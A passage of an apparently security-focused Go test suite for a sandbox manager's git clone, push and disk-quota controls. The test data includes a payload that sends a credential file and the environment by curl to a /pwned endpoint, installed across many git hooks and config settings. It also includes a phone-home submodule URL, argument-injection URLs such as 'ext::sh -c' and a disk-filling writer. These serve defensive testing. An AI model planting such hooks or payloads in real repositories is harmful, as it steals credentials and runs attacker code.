	leafTemplate := &x509.Certificate{SerialNumber: big.NewInt(2), Subject: pkix.Name{CommonName: host}, NotBefore: now.Add(-time.Hour), NotAfter: now.Add(24 * time.Hour), KeyUsage: x509.KeyUsageDigitalSignature, ExtKeyUsage: []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth}}
	leafTemplate.DNSNames = []string{attackGitName}
	if ip := net.ParseIP(host); ip != nil {
		leafTemplate.IPAddresses = []net.IP{ip}
	} else {
		leafTemplate.DNSNames = append(leafTemplate.DNSNames, host)
	}
	caCert, err := x509.ParseCertificate(caDER)
	if err != nil {
		t.Fatal(err)
	}
	leafDER, err := x509.CreateCertificate(rand.Reader, leafTemplate, caCert, &leafKey.PublicKey, caKey)
	if err != nil {
		t.Fatal(err)
	}
	return tls.Certificate{Certificate: [][]byte{leafDER}, PrivateKey: leafKey}, pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: caDER})
}

func (g *gitServer) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	g.mu.Lock()
	g.total++
	hook := g.onGit
	g.mu.Unlock()
	if strings.HasPrefix(r.URL.Path, "/pwned") {
		body, _ := io.ReadAll(io.LimitReader(r.Body, 4096))
		g.mu.Lock()
		g.pwned = append(g.pwned, r.URL.Path+" "+string(body))
		g.mu.Unlock()
		return
	}
	_, password, ok := r.BasicAuth()
	if !ok || password != g.secret {
		g.mu.Lock()
		if ok {
			g.authBad++
		}
		g.mu.Unlock()
		w.Header().Set("WWW-Authenticate", `Basic realm="attack"`)
		w.WriteHeader(http.StatusUnauthorized)
		return
	}
	g.mu.Lock()
	g.authOK++
	g.mu.Unlock()
	if hook != nil {
		hook()
	}
	backend := &cgi.Handler{
		Path: mustGit(),
		Args: []string{"http-backend"},
		Env:  []string{"GIT_PROJECT_ROOT=" + g.root, "GIT_HTTP_EXPORT_ALL=1", "REMOTE_USER=attack", "GIT_CONFIG_NOSYSTEM=1", "GIT_CONFIG_GLOBAL=/dev/null"},
	}
	backend.ServeHTTP(w, r)
}

func mustGit() string {
	path, err := exec.LookPath("git")
	if err != nil {
		panic(err)
	}
	return path
}

func (g *gitServer) requestCount() int {
	g.mu.Lock()
	defer g.mu.Unlock()
	return g.total
}

func (g *gitServer) pwnedRequests() []string {
	g.mu.Lock()
	defer g.mu.Unlock()
	return append([]string(nil), g.pwned...)
}

func gitRun(t *testing.T, dir string, args ...string) string {
	t.Helper()
	command := exec.Command("git", args...)
	command.Dir = dir
	command.Env = append(os.Environ(), "GIT_CONFIG_NOSYSTEM=1", "GIT_CONFIG_GLOBAL=/dev/null", "GIT_AUTHOR_NAME=t", "GIT_AUTHOR_EMAIL=t@example.invalid", "GIT_COMMITTER_NAME=t", "GIT_COMMITTER_EMAIL=t@example.invalid")
	output, err := command.CombinedOutput()
	if err != nil {
		t.Fatalf("git %v: %v\n%s", args, err, output)
	}
	return strings.TrimSpace(string(output))
}

// seedRepo makes a bare repository with one commit on main. The content includes a
// .gitmodules that points at the phone-home path, to prove submodules are not followed.
func (g *gitServer) seedRepo(t *testing.T, name string) string {
	t.Helper()
	bare := filepath.Join(g.root, name+".git")
	gitRun(t, g.root, "init", "--quiet", "--bare", "--initial-branch=main", bare)
	gitRun(t, bare, "config", "http.receivepack", "true")
	work := t.TempDir()
	gitRun(t, work, "init", "--quiet", "--initial-branch=main")
	if err := os.WriteFile(filepath.Join(work, "README"), []byte("seed\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	modules := fmt.Sprintf("[submodule \"evil\"]\n\tpath = evil\n\turl = https://%s/pwned/submodule\n", g.host)
	if err := os.WriteFile(filepath.Join(work, ".gitmodules"), []byte(modules), 0o600); err != nil {
		t.Fatal(err)
	}
	gitRun(t, work, "add", ".")
	gitRun(t, work, "commit", "--quiet", "-m", "seed")
	gitRun(t, work, "tag", "v1")
	gitRun(t, work, "push", "--quiet", "--tags", bare, "main")
	return bare
}

func (g *gitServer) url(name string) string {
	return "https://" + g.host + "/" + name + ".git"
}

func TestAttackGitCloneHasNoCredentialInWorkspace(t *testing.T) {
	env := newEnv(t)
	bare := env.git.seedRepo(t, "clone")
	ref := env.sandbox(t)
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Minute)
	defer cancel()

	// While the helper is working, look at it from the engine's side.
	var inspected []string
	var once sync.Once
	env.git.onGit = func() {
		once.Do(func() { inspected = inspectHelpers(t, ctx) })
	}
	result, err := env.api.GitClone(ctx, ref.id, client.GitCloneRequest{Repository: env.git.url("clone"), Credential: client.Credential(env.git.secret)})
	if err != nil {
		t.Fatalf("clone: %v\nlogs:\n%s", err, env.logs.String())
	}
	if result.Commit != gitRun(t, bare, "rev-parse", "main") {
		t.Fatalf("commit %s", result.Commit)
	}
	if len(inspected) != 1 {
		t.Fatalf("expected to inspect one running helper, saw %d", len(inspected))
	}
	if strings.Contains(inspected[0], env.git.secret) {
		t.Fatal("the credential is visible in the helper's engine inspect output (argv or environment)")
	}
	if strings.Contains(inspected[0], "-workspace") {
		t.Fatalf("the helper can see a workspace volume: %s", inspected[0])
	}
	if !strings.Contains(inspected[0], `"`+LabelRole+`":"`+RoleGitHelper+`"`) {
		t.Fatalf("the helper lacks its role label: %s", inspected[0])
	}
	// Grep the whole workspace, including .git, for the secret and its URL form.
	check := fmt.Sprintf(`cd /workspace; cat clone/README; git -C clone remote get-url origin; git -C clone config --list --show-origin | grep -i -E 'credential|askpass|extraheader' || true; grep -rlF %q /workspace /tmp 2>/dev/null | sed 's/^/LEAK /'; env | grep -F %q | sed 's/^/LEAK /'; ls -a clone/.git/hooks 2>/dev/null | grep -v sample; [ -e clone/evil/.git ] && echo SUBMODULE; true`, env.git.secret, env.git.secret)
	output := env.ok(t, ref, check)
	t.Log(output)
	if strings.Contains(output, "LEAK") || strings.Contains(output, "SUBMODULE") {
		t.Fatalf("clone leaked or followed a submodule:\n%s", output)
	}
	if !strings.Contains(output, env.git.url("clone")) {
		t.Fatalf("origin is not the clean URL:\n%s", output)
	}
	if strings.Contains(strings.ReplaceAll(output, env.git.url("clone"), ""), "@") {
		t.Fatalf("a URL still has user information:\n%s", output)
	}
	if pwned := env.git.pwnedRequests(); len(pwned) != 0 {
		t.Fatalf("a remote submodule was followed: %v", pwned)
	}
	assertNoHelpers(t, ctx)

	// A clone over an existing path, including a symlink out, is refused.
	_, err = env.api.GitClone(ctx, ref.id, client.GitCloneRequest{Repository: env.git.url("clone"), Credential: client.Credential(env.git.secret)})
	wantCode(t, err, client.CodeConflict)
	diff, err := env.api.GitDiff(ctx, ref.id)
	if err != nil {
		t.Fatal(err)
	}
	if strings.TrimSpace(diff.Diff) != "# repository: clone" {
		t.Fatalf("a fresh clone must show no changes: %q", diff.Diff)
	}
	env.ok(t, ref, "cd /workspace/clone && echo change >> README")
	diff, err = env.api.GitDiff(ctx, ref.id)
	if err != nil || !strings.Contains(diff.Diff, "+change") {
		t.Fatalf("diff: %+v, %v", diff, err)
	}
	// A ref is checked out; an unknown one is refused.
	env.ok(t, ref, "rm -rf /workspace/clone")
	if _, err := env.api.GitClone(ctx, ref.id, client.GitCloneRequest{Repository: env.git.url("clone"), Ref: "v1", Credential: client.Credential(env.git.secret)}); err != nil {
		t.Fatal(err)
	}
	env.ok(t, ref, "rm -rf /workspace/clone")
	_, err = env.api.GitClone(ctx, ref.id, client.GitCloneRequest{Repository: env.git.url("clone"), Ref: "no-such-ref", Credential: client.Credential(env.git.secret)})
	wantCode(t, err, client.CodeInvalid)
	assertNoHelpers(t, ctx)
}

func inspectHelpers(t *testing.T, ctx context.Context) []string {
	t.Helper()
	labels := map[string]string{LabelManaged: "true", LabelPrefix: strings.TrimRight(attackPrefix, "-"), LabelRole: RoleGitHelper}
	instances, err := attackDriver.List(ctx, labels)
	if err != nil {
		t.Errorf("list helpers: %v", err)
		return nil
	}
	var out []string
	for _, item := range instances {
		var raw json.RawMessage
		if _, err := attackDriver.do(ctx, http.MethodGet, "/containers/"+item.Name+"/json", nil, &raw); err != nil {
			t.Errorf("inspect helper: %v", err)
			continue
		}
		out = append(out, string(raw))
	}
	return out
}

func assertNoHelpers(t *testing.T, ctx context.Context) {
	t.Helper()
	labels := map[string]string{LabelManaged: "true", LabelPrefix: strings.TrimRight(attackPrefix, "-"), LabelRole: RoleGitHelper}
	instances, err := attackDriver.List(ctx, labels)
	if err != nil {
		t.Fatal(err)
	}
	if len(instances) != 0 {
		t.Fatalf("helpers were left running: %+v", instances)
	}
}

// maliciousSetup arms every code-execution path a repository's own files offer. The
// payload writes a marker, which proves it ran where it ran, and tries to phone home
// with the credential file. Only the helper could reach the server or read that file.
func maliciousSetup(env *attackEnv) string {
	payload := fmt.Sprintf(`#!/bin/sh
echo ran >> /tmp/payload-ran
cred=$(cat /run/kionga/cred 2>/dev/null)
curl -sk --max-time 5 -d "$(hostname) $cred $(env | tr '\n' ' ')" https://%s/pwned/$(basename "$0") >/dev/null 2>&1
exit 0
`, env.git.host)
	return fmt.Sprintf(`set -e
cd /workspace/mal
cat > /workspace/payload.sh <<'PAYLOAD'
%s
PAYLOAD
chmod +x /workspace/payload.sh
for hook in pre-push pre-commit post-commit post-checkout post-merge pre-receive update post-receive reference-transaction fsmonitor-watchman push-to-checkout; do
  cp /workspace/payload.sh .git/hooks/$hook
done
git config core.hooksPath .git/hooks
git config core.sshCommand /workspace/payload.sh
git config core.fsmonitor /workspace/payload.sh
git config core.editor /workspace/payload.sh
git config core.pager /workspace/payload.sh
git config core.askPass /workspace/payload.sh
git config credential.helper '!/workspace/payload.sh'
git config filter.evil.clean /workspace/payload.sh
git config filter.evil.smudge /workspace/payload.sh
git config filter.evil.required true
git config diff.external /workspace/payload.sh
git config url.https://%s/pwned/insteadof.insteadOf %s
git config remote.origin.url https://%s/pwned/remote.git
git config remote.origin.pushurl https://%s/pwned/remote.git
git config alias.push '!/workspace/payload.sh'
git config http.extraHeader 'X-Pwned: yes'
echo '* filter=evil' > .gitattributes
`, payload, env.git.host, env.git.url("mal"), env.git.host, env.git.host)
}

func TestAttackMaliciousRepositoryCannotReachCredentialedHelper(t *testing.T) {
	env := newEnv(t)
	bare := env.git.seedRepo(t, "mal")
	ref := env.sandbox(t)
	ctx, cancel := context.WithTimeout(context.Background(), 8*time.Minute)
	defer cancel()
	if _, err := env.api.GitClone(ctx, ref.id, client.GitCloneRequest{Repository: env.git.url("mal"), Credential: client.Credential(env.git.secret)}); err != nil {
		t.Fatalf("clone: %v\nlogs:\n%s", err, env.logs.String())
	}
	env.ok(t, ref, maliciousSetup(env))
	branch := "kionga/" + ref.runID + "/fix"
	env.ok(t, ref, "cd /workspace/mal && git checkout -q -b "+branch+" && echo fixed > fixed.txt && git add fixed.txt && git commit -q -m fix")
	local := strings.TrimSpace(env.ok(t, ref, "cd /workspace/mal && git rev-parse HEAD"))
	// A positive control: the payload is a working program and it did run here, in the
	// sandbox, during commit. There it has no network and no credential file.
	if ran := env.ok(t, ref, "wc -l < /tmp/payload-ran"); strings.TrimSpace(ran) == "0" {
		t.Fatal("control failed: the payload never ran, so this test would prove nothing")
	}
	before := env.git.requestCount()
	pushed, err := env.api.GitPush(ctx, ref.id, client.GitPushRequest{Repository: env.git.url("mal"), Branch: branch, Credential: client.Credential(env.git.secret)})
	if err != nil {
		t.Fatalf("push: %v\nlogs:\n%s", err, env.logs.String())
	}
	if pushed.Commit != local || pushed.Branch != branch {
		t.Fatalf("pushed %+v, local %s", pushed, local)
	}
	if env.git.requestCount() == before {
		t.Fatal("control failed: the helper never reached the server, so silence would prove nothing")
	}
	if remote := gitRun(t, bare, "rev-parse", "refs/heads/"+branch); remote != local {
		t.Fatalf("the remote has %s, local %s", remote, local)
	}
	if pwned := env.git.pwnedRequests(); len(pwned) != 0 {
		t.Fatalf("repository code ran with network access during push: %v", pwned)
	}
	// The secret never entered the sandbox, and the temporary bundle is gone.
	check := fmt.Sprintf(`grep -rlF %q /workspace /tmp 2>/dev/null | sed 's/^/LEAK /'; ls -a /workspace | grep kionga-xfer | sed 's/^/STALE /'; true`, env.git.secret)
	if output := env.ok(t, ref, check); strings.Contains(output, "LEAK") || strings.Contains(output, "STALE") {
		t.Fatalf("after push:\n%s", output)
	}
	assertNoHelpers(t, ctx)
	if strings.Contains(env.logs.String(), env.git.secret) {
		t.Fatal("the credential reached the manager's log")
	}
}

func TestAttackBranchRule(t *testing.T) {
	env := newEnv(t)
	bare := env.git.seedRepo(t, "rule")
	ref := env.sandbox(t)
	other := "atr-" + randomHex(12)
	ctx, cancel := context.WithTimeout(context.Background(), 8*time.Minute)
	defer cancel()
	if _, err := env.api.GitClone(ctx, ref.id, client.GitCloneRequest{Repository: env.git.url("rule"), Credential: client.Credential(env.git.secret)}); err != nil {
		t.Fatalf("clone: %v", err)
	}
	mainBefore := gitRun(t, bare, "rev-parse", "main")
	own := "kionga/" + ref.runID + "/work"
	env.ok(t, ref, fmt.Sprintf("cd /workspace/rule && git branch kionga/%s/x && git branch %s && git checkout -q %s && echo a > a && git add a && git commit -q -m a", other, own, own))
	before := env.git.requestCount()
	for _, branch := range []string{
		"main", "refs/heads/main", "HEAD", "master", "kionga/" + other + "/x", "kionga/" + ref.runID, "kionga/" + ref.runID + "/",
		"kionga/" + ref.runID + "/a/b", "kionga/" + ref.runID + "/x\n", "kionga/" + ref.runID + "/x y", "+" + own, ":" + own, own + ":main",
		"kionga/" + ref.runID + "/x.lock", "kionga/" + ref.runID + "/..",
	} {
		_, err := env.api.GitPush(ctx, ref.id, client.GitPushRequest{Repository: env.git.url("rule"), Branch: branch, Credential: client.Credential(env.git.secret)})
		if client.Code(err) != client.CodeBranchRejected {
			t.Errorf("branch %q: got %v, want branch_rejected", branch, err)
		}
	}
	if env.git.requestCount() != before {
		t.Fatal("a rejected branch still reached the remote")
	}
	assertNoHelpers(t, ctx)
	if _, err := env.api.GitPush(ctx, ref.id, client.GitPushRequest{Repository: env.git.url("rule"), Branch: own, Credential: client.Credential(env.git.secret)}); err != nil {
		t.Fatalf("own branch: %v\nlogs:\n%s", err, env.logs.String())
	}
	if gitRun(t, bare, "rev-parse", "main") != mainBefore {
		t.Fatal("main moved")
	}
	// No force. The agent rewrites its branch; the remote keeps the old history.
	firstPush := gitRun(t, bare, "rev-parse", "refs/heads/"+own)
	env.ok(t, ref, "cd /workspace/rule && git reset -q --hard HEAD~1 && echo b > b && git add b && git commit -q -m rewritten")
	if _, err := env.api.GitPush(ctx, ref.id, client.GitPushRequest{Repository: env.git.url("rule"), Branch: own, Credential: client.Credential(env.git.secret)}); client.Code(err) != client.CodeGitFailed {
		t.Fatalf("a rewrite must be refused, got %v", err)
	} else if strings.Contains(err.Error(), env.git.secret) {
		t.Fatal("the error carries the credential")
	}
	if gitRun(t, bare, "rev-parse", "refs/heads/"+own) != firstPush {
		t.Fatal("a non-fast-forward push rewrote the branch")
	}
	// Never the default branch, even when the default branch fits the naming rule.
	gitRun(t, bare, "symbolic-ref", "HEAD", "refs/heads/"+own)
	env.ok(t, ref, "cd /workspace/rule && git reset -q --hard origin/"+own+" 2>/dev/null || git fetch -q . ; true")
	_, err := env.api.GitPush(ctx, ref.id, client.GitPushRequest{Repository: env.git.url("rule"), Branch: own, Credential: client.Credential(env.git.secret)})
	wantCode(t, err, client.CodeBranchRejected)
	assertNoHelpers(t, ctx)
}

func TestAttackDisallowedHostsAndBadURLs(t *testing.T) {
	env := newEnv(t)
	ref := env.sandbox(t)
	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Minute)
	defer cancel()
	before := env.git.requestCount()
	host := env.git.host
	rejected := map[string]string{
		"https://github.com/o/r":                    client.CodeHostNotAllowed,
		"https://" + env.git.ip + ":1/r.git":        client.CodeHostNotAllowed,
		"https://" + env.git.ip + ".evil.example/r": client.CodeHostNotAllowed,
		"http://" + host + "/r.git":                 client.CodeInvalid,
		"ssh://git@" + host + "/r.git":              client.CodeInvalid,
		"git@" + env.git.ip + ":r.git":              client.CodeInvalid,
		"file:///etc/r.git":                         client.CodeInvalid,
		"https://x:y@" + host + "/r.git":            client.CodeInvalid,
		"https://" + host + "@evil.example/r":       client.CodeInvalid,
		"https://" + host + "/r.git?x=1":            client.CodeInvalid,
		"https://" + host + "/r.git#f":              client.CodeInvalid,
		"https://" + host + "/r/../s.git":           client.CodeInvalid,
		"https://" + host + "/r.git\n":              client.CodeInvalid,
		"--upload-pack=/workspace/x":                client.CodeInvalid,
		"ext::sh -c /workspace/x":                   client.CodeInvalid,
	}
	for repository, code := range rejected {
		_, err := env.api.GitClone(ctx, ref.id, client.GitCloneRequest{Repository: repository, Credential: client.Credential(env.git.secret)})
		if client.Code(err) != code {
			t.Errorf("clone %q: got %v, want %s", repository, err, code)
		}
		_, err = env.api.GitPush(ctx, ref.id, client.GitPushRequest{Repository: repository, Branch: "kionga/" + ref.runID + "/x", Credential: client.Credential(env.git.secret)})
		if client.Code(err) != code {
			t.Errorf("push %q: got %v, want %s", repository, err, code)
		}
	}
	if env.git.requestCount() != before {
		t.Fatal("a rejected URL reached the network")
	}
	assertNoHelpers(t, ctx)
}

func TestAttackWrongCredentialFailsWithoutLeaking(t *testing.T) {
	env := newEnv(t)
	env.git.seedRepo(t, "auth")
	ref := env.sandbox(t)
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Minute)
	defer cancel()
	wrong := "wrong-" + randomHex(16)
	_, err := env.api.GitClone(ctx, ref.id, client.GitCloneRequest{Repository: env.git.url("auth"), Credential: client.Credential(wrong)})
	wantCode(t, err, client.CodeGitFailed)
	if strings.Contains(err.Error(), wrong) || strings.Contains(env.logs.String(), wrong) {
		t.Fatal("the credential appeared in an error or a log")
	}
	if env.git.authBad == 0 {
		t.Fatal("control failed: the server never saw the wrong credential")
	}
	assertNoHelpers(t, ctx)
}

func TestAttackSymlinkRepositoryIsRejected(t *testing.T) {
	env := newEnv(t)
	env.git.seedRepo(t, "linked")
	ref := env.sandbox(t)
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Minute)
	defer cancel()
	env.ok(t, ref, "ln -s /etc /workspace/linked")
	_, err := env.api.GitPush(ctx, ref.id, client.GitPushRequest{Repository: env.git.url("linked"), Branch: "kionga/" + ref.runID + "/x", Credential: client.Credential(env.git.secret)})
	wantCode(t, err, client.CodePathRejected)
	_, err = env.api.GitClone(ctx, ref.id, client.GitCloneRequest{Repository: env.git.url("linked"), Credential: client.Credential(env.git.secret)})
	if client.Code(err) != client.CodePathRejected && client.Code(err) != client.CodeConflict {
		t.Fatalf("clone onto a symlink: %v", err)
	}
	assertNoHelpers(t, ctx)
}

func TestAttackHelperUsesPinnedAddressOnItsOwnNetwork(t *testing.T) {
	env := newEnv(t)
	env.git.seedRepo(t, "pinned")
	ref := env.sandbox(t)
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Minute)
	defer cancel()
	host := attackGitName + ":" + strconv.Itoa(env.git.port)
	env.service.config.GitHosts = []string{host}
	address, err := netip.ParseAddr(env.git.ip)
	if err != nil {
		t.Skipf("KIONGA_ATTACK_GIT_HOST is not an address: %v", err)
	}
	env.service.resolve = func(context.Context, string) ([]netip.Addr, error) { return []netip.Addr{address}, nil }
	var inspected []string
	var once sync.Once
	env.git.onGit = func() { once.Do(func() { inspected = inspectHelpers(t, ctx) }) }
	repository := "https://" + host + "/pinned.git"
	if _, err := env.api.GitClone(ctx, ref.id, client.GitCloneRequest{Repository: repository, Credential: client.Credential(env.git.secret)}); err != nil {
		t.Fatalf("clone through a name only the pinned entry can resolve: %v\nlogs:\n%s", err, env.logs.String())
	}
	if len(inspected) != 1 {
		t.Fatalf("inspected %d helpers", len(inspected))
	}
	var helper struct {
		HostConfig struct {
			NetworkMode string
			ExtraHosts  []string
		}
		NetworkSettings struct {
			Networks map[string]json.RawMessage
		}
	}
	if err := json.Unmarshal([]byte(inspected[0]), &helper); err != nil {
		t.Fatal(err)
	}
	t.Logf("helper network %s, hosts %v, networks %d", helper.HostConfig.NetworkMode, helper.HostConfig.ExtraHosts, len(helper.NetworkSettings.Networks))
	if _, ok := helper.NetworkSettings.Networks[attackPrefix+"git"]; !ok || len(helper.NetworkSettings.Networks) != 1 {
		t.Fatalf("the helper must be on its dedicated network and no other: %v", helper.NetworkSettings.Networks)
	}
	if _, ok := helper.NetworkSettings.Networks["bridge"]; ok {
		t.Fatal("the helper is on the default bridge")
	}
	assertNoHelpers(t, ctx)
}

func TestAttackPrivateAddressRefusedWithoutTheTestAllowance(t *testing.T) {
	env := newEnv(t)
	ref := env.sandbox(t)
	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Minute)
	defer cancel()
	env.service.config.GitAllowPrivateForTests = false
	before := env.git.requestCount()
	_, err := env.api.GitClone(ctx, ref.id, client.GitCloneRequest{Repository: env.git.url("any"), Credential: client.Credential(env.git.secret)})
	wantCode(t, err, client.CodeHostNotAllowed)
	if env.git.requestCount() != before {
		t.Fatal("a private address was contacted")
	}
	assertNoHelpers(t, ctx)
}

// quotaEnv is a sandbox with a small disk limit and a fast sweep.
func quotaEnv(t *testing.T, extra map[string]string) *attackEnv {
	t.Helper()
	token := "attack-token-" + randomHex(16)
	values := baseEnv(token)
	values["KIONGA_SANDBOX_DISK_MB"] = "64"
	for key, value := range extra {
		values[key] = value
	}
	env := startEnv(t, values, token, nil)
	ctx, cancel := context.WithCancel(context.Background())
	done := make(chan struct{})
	go func() {
		defer close(done)
		ticker := time.NewTicker(env.service.config.DiskCheck)
		defer ticker.Stop()
		for {
			select {
			case <-ctx.Done():
				return
			case <-ticker.C:
				env.service.SweepDisk(ctx)
			}
		}
	}()
	t.Cleanup(func() { cancel(); <-done })
	return env
}

// TestAttackDiskLimitStopsAWriter is the real thing: many files, so the per-file limit
// does not save it, written as fast as the sandbox can, until the sweep stops it.
func TestAttackDiskLimitStopsAWriter(t *testing.T) {
	const checkSeconds = 2
	env := quotaEnv(t, map[string]string{"KIONGA_SANDBOX_DISK_CHECK_SECONDS": strconv.Itoa(checkSeconds)})
	ref := env.sandbox(t)
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Minute)
	defer cancel()
	if _, err := env.api.WriteFile(ctx, ref.id, "keep.txt", []byte("kept\n")); err != nil {
		t.Fatal(err)
	}
	started := time.Now()
	result, err := env.api.Exec(ctx, ref.id, client.ExecRequest{Command: `python3 - <<'PY'
import os
block = os.urandom(1 << 20)
index = 0
while True:
    with open("/workspace/fill-%d" % index, "wb") as out:
        for _ in range(8):
            out.write(block)
        out.flush()
        os.fsync(out.fileno())
    index += 1
PY`, TimeoutSeconds: 120})
	elapsed := time.Since(started)
	t.Logf("the writer ended after %s: result %+v, err %v", elapsed.Round(time.Millisecond), result.ExitCode, err)
	wantCode(t, err, client.CodeQuotaExceeded)
	if elapsed > 90*time.Second {
		t.Fatalf("stopping took %s", elapsed)
	}
	// The stream ends as the kill lands, a moment before the engine records the stop.
	var found Instance
	for attempt := 0; attempt < 60; attempt++ {
		var inspectErr error
		if found, inspectErr = attackDriver.Inspect(ctx, attackPrefix+ref.id); inspectErr != nil {
			t.Fatal(inspectErr)
		}
		if !found.Running {
			break
		}
		time.Sleep(500 * time.Millisecond)
	}
	if found.Running {
		t.Fatalf("the sandbox must be stopped: %+v", found)
	}
	usage, measureErr := env.service.measure(ctx, ref.id, env.service.volumeName(ref.id))
	if measureErr != nil {
		t.Fatal(measureErr)
	}
	limit := env.service.config.DiskBytes
	over := usage.UsedBytes - limit
	t.Logf("MEASURED under %s: limit %d MiB, final usage %d MiB, overshoot %d MiB, in %s with a %d s sweep, about %.0f MiB/s",
		os.Getenv("KIONGA_ATTACK_RUNTIME"), limit>>20, usage.UsedBytes>>20, over>>20, elapsed.Round(time.Millisecond), checkSeconds, float64(usage.UsedBytes>>20)/elapsed.Seconds())
	if usage.UsedBytes <= limit {
		t.Fatalf("control failed: the writer never passed the limit: %d", usage.UsedBytes)
	}

	// Everything that writes or runs is refused, every time, without restarting it.
	for attempt := 0; attempt < 2; attempt++ {
		_, err = env.api.Exec(ctx, ref.id, client.ExecRequest{Command: "echo must-not-run > /workspace/ran"})
		wantCode(t, err, client.CodeQuotaExceeded)
	}
	var failure *client.Error
	if !asClientError(err, &failure) || failure.Status != http.StatusInsufficientStorage {
		t.Fatalf("want a 507: %v", err)
	}
	_, err = env.api.WriteFile(ctx, ref.id, "more", []byte("x"))
	wantCode(t, err, client.CodeQuotaExceeded)
	if found, _ := attackDriver.Inspect(ctx, attackPrefix+ref.id); found.Running {
		t.Fatal("a refused call restarted the sandbox")
	}

	// Documented recovery: files stay readable, then delete gives a clean sandbox.
	content, err := env.api.ReadPath(ctx, ref.id, "keep.txt")
	if err != nil || content.Content != "kept\n" {
		t.Fatalf("read of a stopped sandbox: %+v, %v", content, err)
	}
	listing, err := env.api.ReadPath(ctx, ref.id, ".")
	if err != nil || !listing.IsDirectory {
		t.Fatalf("list of a stopped sandbox: %+v, %v", listing, err)
	}
	for _, entry := range listing.Entries {
		if entry.Name == "ran" {
			t.Fatal("a refused exec ran")
		}
	}
	if found, _ := attackDriver.Inspect(ctx, attackPrefix+ref.id); found.Running {
		t.Fatal("a read restarted the sandbox")
	}
	if err := env.api.Delete(ctx, ref.id); err != nil {
		t.Fatal(err)
	}
	if volumes, _ := attackDriver.ListVolumes(ctx, map[string]string{LabelID: ref.id, LabelPrefix: strings.TrimRight(attackPrefix, "-")}); len(volumes) != 0 {
		t.Fatalf("delete left the volume: %+v", volumes)
	}
	recreated, err := env.api.Create(ctx, client.CreateRequest{RunID: ref.runID, WorkerID: workerOf(ctx, ref), ProjectID: "attack"})
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() {
		cleanup, cancel := context.WithTimeout(context.Background(), time.Minute)
		defer cancel()
		_ = env.api.Delete(cleanup, recreated.ID)
	})
	fresh, err := env.api.Exec(ctx, recreated.ID, client.ExecRequest{Command: "ls -A /workspace | wc -l"})
	if err != nil || strings.TrimSpace(fresh.Stdout) != "0" {
		t.Fatalf("a new sandbox must start empty: %+v, %v", fresh, err)
	}
}

// workerOf returns a fresh worker id; only the run matters to the recovery check.
func workerOf(context.Context, sandboxRef) string { return "atw-" + randomHex(12) }

func TestAttackPerFileLimitIsHard(t *testing.T) {
	env := quotaEnv(t, map[string]string{"KIONGA_SANDBOX_DISK_CHECK_SECONDS": "300"})
	ref := env.sandbox(t)
	result := env.run(t, ref, `python3 - <<'PY'
import signal
signal.signal(signal.SIGXFSZ, signal.SIG_IGN)
written = 0
block = b"x" * (1 << 20)
try:
    with open("/workspace/one", "wb", buffering=0) as out:
        while written < 200:
            out.write(block)
            written += 1
except OSError as error:
    print("refused", error)
print("wrote", written)
PY
stat -c %s /workspace/one`, 60)
	t.Logf("%+v", result)
	if strings.Contains(result.Stdout, "wrote 200") {
		t.Fatalf("one file passed the limit: %+v", result)
	}
	fields := strings.Fields(result.Stdout)
	size, _ := strconv.ParseInt(fields[len(fields)-1], 10, 64)
	if size > env.service.config.DiskBytes {
		t.Fatalf("the file is %d bytes", size)
	}
}

func TestAttackHidingFilesFromTheMeterIsOverTheLimit(t *testing.T) {
	env := quotaEnv(t, map[string]string{"KIONGA_SANDBOX_DISK_CHECK_SECONDS": "300"})
	ref := env.sandbox(t)
	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Minute)
	defer cancel()
	env.ok(t, ref, "mkdir /workspace/hidden && head -c 1048576 /dev/zero > /workspace/hidden/data && chmod 000 /workspace/hidden")
	_, err := env.api.Exec(ctx, ref.id, client.ExecRequest{Command: "true"})
	wantCode(t, err, client.CodeQuotaExceeded)
	if !strings.Contains(err.Error(), "could not be measured") {
		t.Fatalf("%v", err)
	}
}

func TestAttackFileCountLimit(t *testing.T) {
	env := quotaEnv(t, map[string]string{"KIONGA_SANDBOX_DISK_CHECK_SECONDS": "300", "KIONGA_SANDBOX_DISK_FILES": "500"})
	ref := env.sandbox(t)
	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Minute)
	defer cancel()
	env.ok(t, ref, "cd /workspace && for i in $(seq 1 600); do : > f$i; done")
	_, err := env.api.Exec(ctx, ref.id, client.ExecRequest{Command: "true"})
	wantCode(t, err, client.CodeQuotaExceeded)
}

func TestAttackFreeDiskFloorRefusesNewSandboxes(t *testing.T) {
	env := quotaEnv(t, map[string]string{"KIONGA_SANDBOX_DISK_CHECK_SECONDS": "300", "KIONGA_SANDBOX_MIN_FREE_DISK_MB": strconv.FormatInt(maxMinFreeMB, 10)})
	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Minute)
	defer cancel()
	_, err := env.api.Create(ctx, client.CreateRequest{RunID: "atr-" + randomHex(12), WorkerID: "atw-" + randomHex(12), ProjectID: "attack"})
	wantCode(t, err, client.CodeUnavailable)
	if !strings.Contains(err.Error(), "free disk") {
		t.Fatalf("%v", err)
	}
	instances, _ := attackDriver.List(ctx, map[string]string{LabelManaged: "true", LabelPrefix: strings.TrimRight(attackPrefix, "-"), LabelRole: RoleSandbox})
	if len(instances) != 0 {
		t.Fatalf("a sandbox was created under the floor: %+v", instances)
	}
	// The reading is real: a meter under this runtime sees the engine's filesystem.
	usage, err := env.service.measure(ctx, "", attackPrefix+"disk-floor")
	if err != nil {
		t.Fatal(err)
	}
	t.Logf("free disk seen from a meter under %s: %d MiB", os.Getenv("KIONGA_ATTACK_RUNTIME"), usage.FreeBytes>>20)
	if usage.FreeBytes <= 0 {
		t.Fatal("no free disk reading")
	}
	if host, err := exec.Command("df", "-B1", "--output=avail", "/var/lib/docker").Output(); err == nil {
		fields := strings.Fields(string(host))
		hostFree, _ := strconv.ParseInt(fields[len(fields)-1], 10, 64)
		t.Logf("host df says %d MiB free", hostFree>>20)
